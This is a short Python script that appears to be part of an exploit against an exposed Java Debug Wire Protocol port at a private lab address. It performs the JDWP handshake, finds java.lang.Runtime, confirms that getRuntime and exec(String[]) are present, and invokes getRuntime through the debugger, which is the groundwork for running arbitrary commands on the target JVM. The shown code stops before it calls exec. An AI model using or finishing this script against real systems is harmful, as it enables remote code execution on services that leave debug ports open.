import socket
import struct

s = socket.create_connection(("172.23.0.2", 5005), timeout=20)
s.sendall(b"JDWP-Handshake")
s.recv(14)
ids = [0]


def cmd(cmdset, c, data=b""):
    ids[0] += 1
    pid = ids[0]
    s.sendall(struct.pack(">IIBBB", 11 + len(data), pid, 0, cmdset, c) + data)
    hdr = b""
    while len(hdr) < 11:
        hdr += s.recv(11 - len(hdr))
    ln, rid, flags, err = struct.unpack(">IIBH", hdr)
    body = b""
    while len(body) < ln - 11:
        body += s.recv(ln - 11 - len(body))
    return err, body


err, b = cmd(1, 2, struct.pack(">I", 20) + b"Ljava/lang/Runtime;")
(cnt, ) = struct.unpack(">i", b[:4])
runtime_ref = b[4:12]
print("Runtime ref err=%d cnt=%d ref=%s" % (err, cnt, runtime_ref.hex()))

err, b = cmd(2, 5, runtime_ref)  # Methods
(n, ) = struct.unpack(">i", b[:4])
off = 4
mids = {}
for _ in range(n):
    mid = b[off:off + 8]; off += 8
    nm_n = struct.unpack(">I", b[off:off + 4])[0]; off += 4
    nm = b[off:off + nm_n].decode(); off += nm_n
    sg_n = struct.unpack(">I", b[off:off + 4])[0]; off += 4
    sg = b[off:off + sg_n].decode(); off += sg_n
    off += 4
    mids[(nm, sg)] = mid
print("methods: %d entries; has getRuntime=%s exec(String[])=%s"
      % (n, ("getRuntime", "()Ljava/lang/Runtime;") in mids,
         ("exec", "([Ljava/lang/String;)Ljava/lang/Process;") in mids))

err, b = cmd(1, 4)
(cnt, ) = struct.unpack(">i", b[:4])
t1 = b[4:12]

mid_gr = mids[("getRuntime", "()Ljava/lang/Runtime;")]
# ClassType.InvokeMethod: classId, threadId, methodID, args, options
data = runtime_ref + t1 + mid_gr + struct.pack(">i", 0) + struct.pack(">i", 1)
err, b = cmd(3, 3, data)
print("invoke getRuntime(singleThreaded, running thread) err=%d body=%s"
      % (err, b.hex()[:60]))

# also try options=0
data = runtime_ref + t1 + mid_gr + struct.pack(">i", 0) + struct.pack(">i", 0)
err, b = cmd(3, 3, data)
print("invoke getRuntime(options=0) err=%d body=%s" % (err, b.hex()[:60]))
